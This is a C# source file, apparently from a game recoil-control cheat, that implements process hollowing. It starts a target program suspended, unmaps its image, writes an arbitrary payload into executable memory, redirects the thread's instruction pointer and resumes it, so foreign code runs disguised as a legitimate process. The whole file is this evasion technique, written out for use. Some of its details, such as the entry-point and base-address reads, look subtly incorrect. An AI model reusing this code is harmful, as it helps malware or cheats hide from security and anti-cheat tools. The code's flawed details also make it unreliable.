using System;
using System.IO;
using System.Runtime.InteropServices;

namespace RecoilController
{
    public static class ProcessHollowing
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;
            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;
            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
        }

        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CONTEXT_FULL = 0x100000;

        public static void RunHollowed(string targetProcessPath, byte[] payloadBytes)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            if (!CreateProcess(
                targetProcessPath,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out processInfo))
            {
                throw new Exception($"Failed to create suspended process. Error: {Marshal.GetLastWin32Error()}");
            }

            try
            {
                int e_lfanew = BitConverter.ToInt32(payloadBytes, 0x3C);
                long entryPointOffset = BitConverter.ToInt64(payloadBytes, e_lfanew + 0x28);
                IntPtr entryPoint = new IntPtr(entryPointOffset);

                IntPtr baseAddress = GetProcessBaseAddress(processInfo.hProcess);
                if (baseAddress != IntPtr.Zero)
                {
                    NtUnmapViewOfSection(processInfo.hProcess, baseAddress);
                }

                IntPtr allocAddress = VirtualAllocEx(
                    processInfo.hProcess,
                    baseAddress,
                    (uint)payloadBytes.Length,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                if (allocAddress == IntPtr.Zero)
                {
                    throw new Exception($"Failed to allocate memory. Error: {Marshal.GetLastWin32Error()}");
                }

                IntPtr bytesWritten;
                if (!WriteProcessMemory(processInfo.hProcess, allocAddress, payloadBytes, (uint)payloadBytes.Length, out bytesWritten))
                {
                    throw new Exception($"Failed to write payload. Error: {Marshal.GetLastWin32Error()}");
                }

                CONTEXT64 context = new CONTEXT64();
                context.ContextFlags = CONTEXT_FULL;

                if (!GetThreadContext(processInfo.hThread, ref context))
                {
                    throw new Exception($"Failed to get thread context. Error: {Marshal.GetLastWin32Error()}");
                }

                context.Rcx = (ulong)allocAddress.ToInt64();
                context.Rip = (ulong)allocAddress.ToInt64() + (ulong)entryPointOffset;

                if (!SetThreadContext(processInfo.hThread, ref context))
                {
                    throw new Exception($"Failed to set thread context. Error: {Marshal.GetLastWin32Error()}");
                }

                uint result = ResumeThread(processInfo.hThread);
                if (result == uint.MaxValue)
                {
                    throw new Exception($"Failed to resume thread. Error: {Marshal.GetLastWin32Error()}");
                }

                Console.WriteLine($"Process hollowing successful! PID: {processInfo.dwProcessId}");
            }
            catch (Exception ex)
            {
                throw new Exception($"Hollowing error: {ex.Message}");
            }
        }

        private static IntPtr GetProcessBaseAddress(IntPtr hProcess)
        {
            try
            {
                byte[] buffer = new byte[8];
                IntPtr bytesRead;
                if (ReadProcessMemory(hProcess, new IntPtr(0x400000), buffer, 8, out bytesRead))
                {
                    return new IntPtr(BitConverter.ToInt64(buffer, 0));
                }
                return new IntPtr(0x400000);
            }
            catch
            {
                return new IntPtr(0x400000);
            }
        }

        public static byte[] LoadExeToBytes(string filePath)
        {
            return File.ReadAllBytes(filePath);
        }
    }
}